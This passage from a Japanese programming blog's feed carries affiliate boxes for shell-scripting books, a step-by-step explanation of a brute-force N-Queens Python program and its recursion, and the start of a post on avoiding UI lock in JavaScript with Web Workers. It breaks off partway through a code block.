&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第2回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（２）</title><link>https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/</link><pubDate>Tue, 01 Feb 2022 15:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/chess.jpg" alt="Featured image of post 第2回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（２）" />&lt;h2 id="グローバル変数">グローバル変数&lt;/h2>
&lt;p>今回は、前回からの引き続きでブルートフォース力任せ探索のプログラムの詳細部分を説明します。&lt;/p>
&lt;p>プログラムのソースは以下のURLをご覧ください。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py&lt;/a>&lt;/p>
&lt;p>まず、グローバル変数を見ていきましょう。&lt;/p>
&lt;p>417~420行目で設定しています。&lt;/p>
&lt;p>417行目 MAX、418行目 SIZEでNの数を指定します。&lt;br>
プログラムは8ですが、動作を説明するために4に変更してみてください。&lt;/p>
&lt;pre tabindex="0">&lt;code>MAX = 4
SIZE = 4
&lt;/code>&lt;/pre>&lt;p>以降はN=4の問題として説明します。&lt;/p>
&lt;p>419行目 ABOARDという配列を宣言しクイーンを置いていきます。&lt;br>
ABOARD = [0 for i in range(MAX)]で4個の要素を0で初期化しています。&lt;br>
ABOARD = [0,0,0,0] と同じです。&lt;/p>
&lt;p>ABOARD[0]は1行目のクイーンを置く位置です0から3までの数字が入ります。&lt;br>
ABOARD[0]が3だと右から4番目にクイーンを置く感じになります。&lt;/p>
&lt;p>420行目 COUNT=0 でCOUNTを初期化しています。&lt;/p>
&lt;h2 id="nqueenメソッド">nqueenメソッド&lt;/h2>
&lt;p>グローバル変数の宣言が終わったら441行目でnqueenメソッドが呼び出されます。&lt;/p>
&lt;p>439行目でnqueenメソッドを再帰的に呼び出しているのが最も特徴的です。&lt;/p>
&lt;p>全体の動作については次の「再帰について」で図を交えて説明しますが前提として各行が何をしているか押さえましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code> global ABOARD
&lt;/code>&lt;/pre>&lt;p>433行目で global ABOARDとして変数宣言しています。&lt;br>
関数内でグローバル変数に値を代入したい場合は、変数宣言時にglobalをつける必要があります。&lt;br>
globalをつけないとローカル変数として扱われます。&lt;br>
ちなみに、私は試しに433行目を削除して実行してみたのですがエラーになりました。&lt;/p>
&lt;pre tabindex="0">&lt;code> if row is SIZE:
printout()
&lt;/code>&lt;/pre>&lt;p>434行目 if row is SIZE: はrowイコールSIZEという意味です。&lt;br>
if row == SIZE: としても今回は同じ動きになります。&lt;/p>
&lt;p>434-435行でやっていることは434行目のif文で最終行までクイーンを置き終わっているかどうかを判定し置き終わっていたらprintoutメソッドを呼び出してCOUNT数と各行のクイーンの設置場所を出力します。&lt;/p>
&lt;pre tabindex="0">&lt;code> for i in range(SIZE)
&lt;/code>&lt;/pre>&lt;p>437行目 for i in range(SIZE) は0からスタートしてSIZEの回数分0,1,2,3と1ずつインクリメントしながらfor文を回します。&lt;br>
やっていることは各行にクイーンを設置する場所を右から左に1個ずつずらしています。1番左端までいったらfor文を抜けます。&lt;/p>
&lt;pre tabindex="0">&lt;code> ABOARD[row] = i
&lt;/code>&lt;/pre>&lt;p>438行目のABOARD[row]=iでクイーンを設置しています。&lt;br>
rowは行を意味します。0からスタートして0,1,2,3まであります。&lt;br>
例えば、0だと1行目、3だと4行目となります。&lt;/p>
&lt;p>iはクイーンを設置する列になります。&lt;br>
0からスタートして0,1,2,3まであります。&lt;br>
例えば、0だと右から1列目、3だと右から4列目となります。&lt;/p>
&lt;p>例えばABOARD[2]=3 の場合は&lt;br>
3行目は右から4列目にクイーンを置くことになります。&lt;/p>
&lt;pre tabindex="0">&lt;code> nqueen(row+1)
&lt;/code>&lt;/pre>&lt;p>439行目のnqueen(row+1)で再帰的にnqueenメソッドを呼び出しています。&lt;br>
やっていることは次の行への移動です。&lt;/p>
&lt;h2 id="再帰の動きについて">再帰の動きについて&lt;/h2>
&lt;p>再帰の基本的な動作で押さえたいのは以下の2つです。&lt;br>
・再帰を呼び出した時の動作&lt;br>
通常のメソッド呼び出しと同じです。メソッドの先頭に移動します。引数に渡された値が反映されます。&lt;br>
・再帰から抜ける時の動作&lt;br>
再帰から抜けると1階層前に戻り再帰を呼び出した場所の次の行に移動します。&lt;br>
変数の状態は再帰を呼び出す直前の状態に戻ります。&lt;/p>
&lt;p>再帰の呼び出しが実際にどういう動きになっているかは頭で考えても難しいので図を見ながら説明します。&lt;/p>
&lt;p>444行目でnqueenを0を渡して呼び出します(1階層目)。&lt;br>
432行目からスタートして&lt;br>
row=0なので436行目のelse:に行きそのまま437行目のfor文に入ります&lt;br>
最初のfor文なのでi=0です。&lt;br>
row=0なので&lt;br>
ABOARD[0]=0&lt;br>
で&lt;br>
1行目の右端にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q1.png" data-size="322x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q1.png"
width="322"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを呼び出します。&lt;br>
row=0 row+1=1なので&lt;br>
nqueenを引数1を渡して呼び出します(2階層目)&lt;br>
432行目からスタートして&lt;br>
row=1なので436行目のelse:に行きそのまま437行目のfor文に入ります&lt;br>
最初のfor文なのでi=0です。&lt;br>
さっきもfor文が出てきましたが再帰は階層ごとにローカル変数を別に考える必要があります。&lt;br>
row=1なので&lt;br>
ABOARD[1]=0&lt;br>
で&lt;br>
2行目の右端にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 103;
flex-basis: 249px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q2.png" data-size="328x316">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q2.png"
width="328"
height="316"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数2を渡して呼び出します(3階層目)。&lt;br>
同様にfor文に入り、i=0 row=2なので&lt;br>
ABOARD[2]=0&lt;br>
で&lt;br>
3行目の右端にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q3.png" data-size="330x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q3.png"
width="330"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数3を渡して呼び出します(4階層目)。&lt;/p>
&lt;p>同様にfor文に入り、i=0 row=3なので&lt;br>
ABOARD[3]=0&lt;br>
で&lt;br>
4行目の右端にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 237px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q4.png" data-size="324x328">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q4.png"
width="324"
height="328"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。&lt;/p>
&lt;p>row=4なのでif row is SIZE:でprintout()メソッドを呼び出してCOUNTと各行のクイーンの位置を出力します。&lt;br>
printout()後再帰から抜けて4階層目の439行目の後ろに移動します。&lt;br>
変数は再帰を呼び出す直前のものに戻るのでrowは3 iは0になります。&lt;/p>
&lt;p>for文の中にあるのでiを1インクリメントしてiは1になり次のfor文に移動します。&lt;br>
_&lt;br>
ABOARD[3]=1&lt;br>
で&lt;br>
4行目の右から2番目にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q5.png" data-size="322x320">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q5.png"
width="322"
height="320"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。&lt;br>
row=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。&lt;/p>
&lt;p>for文の中にあるのでiを1インクリメントしてiは2になり次のfor文に移動します。&lt;br>
_&lt;br>
ABOARD[3]=2&lt;br>
で&lt;br>
4行目の右から3番目にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q6.png" data-size="326x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q6.png"
width="326"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。&lt;br>
row=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。&lt;/p>
&lt;p>for文の中にあるのでiを1インクリメントしてiは3になり次のfor文に移動します。&lt;br>
_&lt;br>
ABOARD[3]=3&lt;br>
で&lt;br>
4行目の右から4番目にクイーンを置きます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q7.png" data-size="332x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q7.png"
width="332"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。&lt;br>
row=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。&lt;br>
for文でiを1インクリメントすると4ですがrange(4)だと0,1,2,3までなのでここでfor文を抜けます。&lt;/p>
&lt;p>for文を抜けると439行目には移動しないので再帰から抜けて3階層目の439行目に移動します。&lt;/p>
&lt;p>3階層目ではrow=2 iは0です。&lt;br>
for文の中にあるのでiを1インクリメントしてiは1になり次のfor文に移動します。&lt;/p>
&lt;p>ABOARD[2]=1&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q8.png" data-size="326x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q8.png"
width="326"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数3を渡して呼び出します(4階層目)。&lt;/p>
&lt;p>row=3なので436行目のelse:に行きそのまま437行目のfor文に入ります&lt;br>
最初のfor文なのでi=0です。&lt;/p>
&lt;p>ABOARD[3]=0&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 244px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q9.png" data-size="326x320">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/q9.png"
width="326"
height="320"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。&lt;br>
row=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。&lt;br>
という感じで下の階層からfor文でぐるぐる回転しながらうごいてゆきます。&lt;/p></description></item><item><title>Javascriptで画面ロックする場合は、Workerを使ってみよう</title><link>https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/</link><pubDate>Tue, 01 Feb 2022 14:19:43 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/catch.jpg" alt="Featured image of post Javascriptで画面ロックする場合は、Workerを使ってみよう" />&lt;p>Javascript で重い処理を書く際や for や while などのループを記述する際に気をつけないといけないのがUIロックです。&lt;/p>
&lt;p>特に重い処理を行うと、js の処理に力を使ってしまって画面が固まってUIなどの操作性が格段に落ちてしまい、ブラウザなどからは応答に時間がかかっておりますといったアラートが表示される原因になります。&lt;/p>
&lt;p>そういったときは &lt;strong>Worker&lt;/strong> を使って重い処理を別タスクとして実行することで、画面上の処理と、重い処理を分けることができ、その結果画面をロックすることなく表示させることが可能になります。&lt;/p>
&lt;p>今回はその方法を説明していきます。&lt;/p>
&lt;h2 id="uiをロックしてしまうループ処理">UIをロックしてしまうループ処理&lt;/h2>
&lt;p>まずは画面をロックしてしまうような記述です。&lt;br>
下記のような HTML があったとしましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html:index.html" data-lang="html:index.html">&lt;span class="cp">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span> &lt;span class="na">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;ja&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;viewport&amp;#34;&lt;/span> &lt;span class="na">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Document&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">style&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">#&lt;/span>&lt;span class="nn">animation&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">before&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">content&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="kt">em&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="kt">em&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">border&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="kc">solid&lt;/span> &lt;span class="kc">black&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">@&lt;/span>&lt;span class="k">keyframes&lt;/span> &lt;span class="nt">rotation&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">0&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">{&lt;/span> &lt;span class="k">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">rotate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);}&lt;/span>
&lt;span class="nt">100&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">{&lt;/span> &lt;span class="k">transform&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">rotate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">360&lt;/span>&lt;span class="kt">deg&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">run&lt;/span> &lt;span class="p">#&lt;/span>&lt;span class="nn">animation&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">before&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">animation&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="kt">s&lt;/span> &lt;span class="kc">linear&lt;/span> &lt;span class="kc">infinite&lt;/span> &lt;span class="k">rotation&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">run&lt;/span> &lt;span class="nt">button&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">background-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">red&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">style&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">div&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;animation&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">div&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span> &lt;span class="na">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;button&amp;#34;&lt;/span> &lt;span class="na">onClick&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;run()&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Run&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h1&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;counter&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">h1&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;time&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>この HTML は counter 部分 に文字を出力できるようにしてあります。&lt;br>
そして、実行時間を time 部分に出力できるようにしてあります。&lt;/p>
&lt;p>それでは、ここに for 文を使って、文字を追加していってみます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript:for01.js" data-lang="javascript:for01.js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">classList&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#counter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">elem&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
